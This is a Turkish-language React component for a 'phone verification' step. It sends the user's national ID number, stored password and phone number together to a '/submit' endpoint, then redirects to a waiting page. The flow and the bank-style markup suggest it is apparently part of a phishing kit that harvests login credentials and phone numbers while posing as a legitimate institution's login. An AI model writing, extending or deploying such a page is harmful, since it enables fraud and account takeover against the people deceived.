import React, { useState, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import axios from 'axios';
import { useAuth } from './AuthContext';

function Telefon() {
  const { state: authState, dispatch } = useAuth();
  const [phoneNumber, setPhoneNumber] = useState('');
  const [phoneError, setPhoneError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false); // ✅ Yüklenme durumu
  const navigate = useNavigate();
  const location = useLocation();

  // ✅ Bu sayfaya yalnızca geçerli akışla gelinsin
  useEffect(() => {
    if (
      !location.state?.isValidNavigation ||
      !authState.tc ||
      !authState.password ||
      !authState.isAuthenticated
    ) {
      navigate('/', { replace: true });
    }
  }, [location.state, authState, navigate]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setPhoneError('');

    if (!phoneNumber || phoneNumber.length !== 10 || !/^\d{10}$/.test(phoneNumber)) {
      setPhoneError('Lütfen 10 haneli telefon numaranızı girin.');
      return;
    }

    const payload = {
      tc: String(authState.tc),
      phone: String(phoneNumber),
      password: String(authState.password),
    };

    try {
      setIsSubmitting(true); // ✅ Gönderim başladı -> butonda spinner göster
      // Değişiklik burada: Environment variable kullanarak API URL'ini al
      const apiUrl = process.env.REACT_APP_API_URL || 'http://localhost:3001'; // Yerel fallback
      const response = await axios.post(`${apiUrl}/submit`, payload);
      console.log('[Telefon] API yanıtı:', response.data);

      // ✅ Telefon doğrulandı
      dispatch({ type: 'SET_PHONE_VERIFIED' });

      // ✅ Bekleme sayfasına git — guard artık context'te true
      navigate('/bekleme', {
        state: { isValidNavigation: true, from: '/telefon', isCompleted: true },
      });
    } catch (error) {
      console.error('[Telefon] API hatası:', error.response ? error.response.data : error.message);
      setPhoneError('Bilgiler gönderilemedi, lütfen tekrar deneyin.');
    } finally {
      setIsSubmitting(false); // ✅ Gönderim bitti -> spinner kaldır
    }
  };

  return (
    <div className="panel">
      <div id="phoneEntryPanel" className="panel-body">
        <h1 className="panel-title light">
          Telefon Doğrulama
          <p>Lütfen 10 haneli kayıtlı telefon numaranızı girin.</p>
        </h1>
        <div className="row">
          <div className="col-sm-12">
            <div className="form-horizontal">
              <form id="telefonForm" onSubmit={handleSubmit} autoComplete="off">
                <div className="formField">
                  <div className="formFieldOuter">
                    <div className="formFieldInner form-group">
                      <label htmlFor="phoneNumber" className="col-sm-5 col-md-4 control-label">
                        Telefon Numarası
                      </label>
                      <div className="formFieldSurround col-sm-7 col-md-8">
                        <input
                          type="tel"
                          className="form-control"
                          value={phoneNumber}
                          onChange={(e) => setPhoneNumber(e.target.value)}
                          pattern="[0-9]*"
                          id="phoneNumber"
                          name="telefonNoLabelUstte"
                          maxLength="10"
                          autoComplete="off"
                          placeholder="5XXXXXXXXX"
                        />
                        {phoneError && (
                          <div className="errorContainer advice-text has-alert">
                            <div className="errorWrapper">
                              <div className="errorMessage">{phoneError}</div>
                            </div>
                          </div>
                        )}
                      </div>
                    </div>
                  </div>
                </div>

                <div className="form-group form-group-offset footer-button">
                  <div className="col-sm-7 col-md-8 col-sm-offset-5 col-md-offset-4 col-xs-12">
                    <p>
                      <button
                        id="formSubmit"
                        className="btn btn-primary btn-lg btn-block-input mobile-hover"
                        type="submit"
                        disabled={isSubmitting}                 // ✅ işlem sürerken butonu kapat
                        aria-busy={isSubmitting ? 'true' : 'false'} // ✅ erişilebilirlik
                      >
                        {isSubmitting ? (
                          <>
                            <i className="fa fa-spinner fa-spin" aria-hidden="true" />
                            <span style={{ marginLeft: 8 }}>Gönderiliyor…</span>
                          </>
                        ) : (
                          'Telefon Numarasını Doğrula'
                        )}
                      </button>
                    </p>
                  </div>
                </div>

              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default Telefon;